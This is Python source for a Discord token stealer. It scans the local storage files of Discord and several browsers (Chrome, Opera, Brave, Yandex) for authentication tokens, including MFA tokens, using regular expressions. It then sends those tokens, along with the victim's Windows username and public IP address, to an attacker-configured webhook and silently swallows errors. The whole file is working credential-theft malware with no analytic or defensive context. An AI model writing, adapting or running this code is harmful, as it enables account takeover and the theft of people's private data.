import os
from json import dumps
from os import environ, getenv, listdir
from re import findall

from requests import get

from modules.config import PING_ME, WEBHOOK_URL
from modules.tools import webhook_request

# FIX LATER TO LAZY TO FIX


def find_tokens(path):
    try:
        path += "\\Local Storage\\leveldb"
        tokens = []

        for file_name in listdir(path):
            if not file_name.endswith(".log") and not file_name.endswith(".ldb"):
                continue

            for line in [
                x.strip()
                for x in open(f"{path}\\{file_name}", errors="ignore").readlines()
                if x.strip()
            ]:
                for regex in (
                    r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}",
                    r"mfa\.[\w-]{84}",
                ):
                    for token in findall(regex, line):
                        tokens.append(token)
        return tokens
    except Exception:
        pass


def logger():
    local = getenv("LOCALAPPDATA")
    roaming = getenv("APPDATA")

    paths = {
        "Discord": f"{roaming}\\Discord",
        "Discord Canary": f"{roaming}\\discordcanary",
        "Discord PTB": f"{roaming}\\discordptb",
        "Google Chrome": f"{local}\\Google\\Chrome\\User Data\\Default",
        "Opera": f"{roaming}\\Opera Software\\Opera Stable",
        "Brave": f"{local}\\BraveSoftware\\Brave-Browser\\User Data\\Default",
        "Yandex": f"{local}\\Yandex\\YandexBrowser\\User Data\\Default",
    }

    message = "@everyone" if PING_ME else ""

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f"\n**{platform}**\n```\n"
        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f"{token}\n"
        else:
            message += "No tokens found.\n"

        message += "```"

    payload = dumps({"content": message})

    try:
        webhook_request(payload)
    except Exception:
        pass


def steal():
    info = f"**Computer Username** ``{environ['USERNAME']}\n`` **IP Address** ``{get('https://api.ipify.org').text}``"

    try:
        payload = dumps({"content": info})
        webhook_request(payload)
    except Exception:
        pass
